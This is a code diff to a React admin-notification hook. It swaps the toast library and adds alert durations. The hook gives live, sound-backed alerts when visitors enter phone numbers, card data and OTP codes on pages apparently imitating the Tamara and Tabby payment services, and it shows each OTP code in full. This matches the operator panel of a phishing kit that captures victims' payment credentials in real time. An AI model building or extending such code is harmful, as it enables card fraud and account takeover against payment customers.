@@ -1,7 +1,7 @@
 import { useEffect, useRef } from 'react';
 import { useLocation } from 'react-router-dom';
 import { supabase } from '@/integrations/supabase/client';
-import { useToast } from '@/hooks/use-toast';
+import { toast } from 'sonner';
 
 export const useAdminNotifications = () => {
   const audioRef = useRef<HTMLAudioElement | null>(null);
@@ -9,7 +9,6 @@ export const useAdminNotifications = () => {
   const cardInfoAudioRef = useRef<HTMLAudioElement | null>(null);
   const otpAudioRef = useRef<HTMLAudioElement | null>(null);
   const location = useLocation();
-  const { toast } = useToast();
 
   useEffect(() => {
     // فقط في صفحات الأدمن
@@ -51,9 +50,9 @@ export const useAdminNotifications = () => {
         (payload) => {
           console.log('🔔 طلب جديد! تشغيل الصوت...', payload.new);
           playNotificationSound();
-          toast({
-            title: 'طلب جديد!',
+          toast.success('طلب جديد!', {
             description: `تم استلام طلب جديد من ${payload.new.owner_name || 'عميل'}`,
+            duration: 5000,
           });
         }
       )
@@ -72,8 +71,7 @@ export const useAdminNotifications = () => {
         (payload) => {
           console.log('🔔 عميل جديد أدخل بياناته في تمارة!', payload.new);
           playNotificationSound();
-          toast({
-            title: '📱 عميل جديد في تمارة - أدخل بياناته!',
+          toast.info('📱 عميل جديد في تمارة - أدخل بياناته!', {
             description: `الهاتف: ${payload.new.phone || 'غير متوفر'} | المبلغ: ${payload.new.total_amount || '0'} ر.س`,
             duration: 15000,
           });
@@ -94,8 +92,7 @@ export const useAdminNotifications = () => {
         (payload) => {
           console.log('🔔 عميل جديد أدخل رقمه في تابي!', payload.new);
           playNotificationSound();
-          toast({
-            title: '📱 عميل جديد في تابي - أدخل رقم هاتفه!',
+          toast.info('📱 عميل جديد في تابي - أدخل رقم هاتفه!', {
             description: `الهاتف: ${payload.new.phone || 'غير متوفر'} | المبلغ: ${payload.new.total_amount || '0'} ر.س`,
             duration: 15000,
           });
@@ -116,9 +113,9 @@ export const useAdminNotifications = () => {
         (payload) => {
           if (payload.new.event_type === 'payment_page_visit') {
             playPaymentPageSound();
-            toast({
-              title: 'عميل وصل لصفحة الدفع!',
+            toast.info('عميل وصل لصفحة الدفع!', {
               description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
+              duration: 5000,
             });
           }
         }
@@ -137,9 +134,9 @@ export const useAdminNotifications = () => {
         },
         (payload) => {
           playCardInfoSound();
-          toast({
-            title: 'عميل أدخل بيانات بطاقة!',
+          toast.warning('عميل أدخل بيانات بطاقة!', {
             description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
+            duration: 5000,
           });
         }
       )
@@ -157,9 +154,9 @@ export const useAdminNotifications = () => {
         },
         (payload) => {
           playCardInfoSound();
-          toast({
-            title: 'عميل أدخل بيانات بطاقة في تابي!',
+          toast.warning('عميل أدخل بيانات بطاقة في تابي!', {
             description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
+            duration: 5000,
           });
         }
       )
@@ -177,9 +174,9 @@ export const useAdminNotifications = () => {
         },
         (payload) => {
           playCardInfoSound();
-          toast({
-            title: 'عميل أدخل بيانات بطاقة في تمارة!',
+          toast.warning('عميل أدخل بيانات بطاقة في تمارة!', {
             description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
+            duration: 5000,
           });
         }
       )
@@ -198,15 +195,15 @@ export const useAdminNotifications = () => {
         (payload) => {
           if (payload.new.event_type === 'tabby_otp_page_visit') {
             playOtpSound();
-            toast({
-              title: 'عميل وصل لصفحة التحقق في تابي!',
+            toast.info('عميل وصل لصفحة التحقق في تابي!', {
               description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
+              duration: 5000,
             });
           } else if (payload.new.event_type === 'tamara_otp_page_visit') {
             playOtpSound();
-            toast({
-              title: 'عميل وصل لصفحة التحقق في تمارة!',
+            toast.info('عميل وصل لصفحة التحقق في تمارة!', {
               description: `شركة: ${payload.new.event_data?.company || 'غير محدد'}`,
+              duration: 5000,
             });
           }
         }
@@ -226,9 +223,9 @@ export const useAdminNotifications = () => {
         (payload) => {
           console.log('🔔 عميل أدخل OTP!', payload.new);
           playOtpSound();
-          toast({
-            title: 'عميل أدخل رمز التحقق OTP!',
+          toast.success('عميل أدخل رمز التحقق OTP!', {
             description: `الكود: ${payload.new.otp_code}`,
+            duration: 5000,
           });
         }
       )
@@ -247,9 +244,9 @@ export const useAdminNotifications = () => {
         (payload) => {
           console.log('🔔 عميل أدخل OTP في تابي!', payload.new);
           playOtpSound();
-          toast({
-            title: 'عميل أدخل رمز التحقق في تابي!',
+          toast.success('عميل أدخل رمز التحقق في تابي!', {
             description: `الكود: ${payload.new.otp_code}`,
+            duration: 5000,
           });
         }
       )
@@ -268,9 +265,9 @@ export const useAdminNotifications = () => {
         (payload) => {
           console.log('🔔 عميل أدخل OTP في تمارة!', payload.new);
           playOtpSound();
-          toast({
-            title: 'عميل أدخل رمز التحقق في تمارة!',
+          toast.success('عميل أدخل رمز التحقق في تمارة!', {
             description: `الكود: ${payload.new.otp_code}`,
+            duration: 5000,
           });
         }
       )
@@ -299,10 +296,8 @@ export const useAdminNotifications = () => {
         .then(() => console.log('✅ تم تشغيل صوت معلومات العميل بنجاح'))
         .catch((error) => {
           console.error('❌ خطأ في تشغيل صوت معلومات العميل:', error);
-          toast({
-            title: 'فشل تشغيل الصوت',
+          toast.error('فشل تشغيل الصوت', {
             description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
-            variant: 'destructive',
           });
         });
     }
@@ -325,10 +320,8 @@ export const useAdminNotifications = () => {
         .then(() => console.log('✅ تم تشغيل صوت بيانات البطاقة بنجاح'))
         .catch((error) => {
           console.error('❌ خطأ في تشغيل صوت بيانات البطاقة:', error);
-          toast({
-            title: 'فشل تشغيل الصوت',
+          toast.error('فشل تشغيل الصوت', {
             description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
-            variant: 'destructive',
           });
         });
     }
@@ -342,10 +335,8 @@ export const useAdminNotifications = () => {
         .then(() => console.log('✅ تم تشغيل صوت OTP بنجاح'))
         .catch((error) => {
           console.error('❌ خطأ في تشغيل صوت OTP:', error);
-          toast({
-            title: 'فشل تشغيل الصوت',
+          toast.error('فشل تشغيل الصوت', {
             description: 'يرجى النقر في أي مكان بالصفحة للسماح بتشغيل الأصوات',
-            variant: 'destructive',
           });
         });
     }
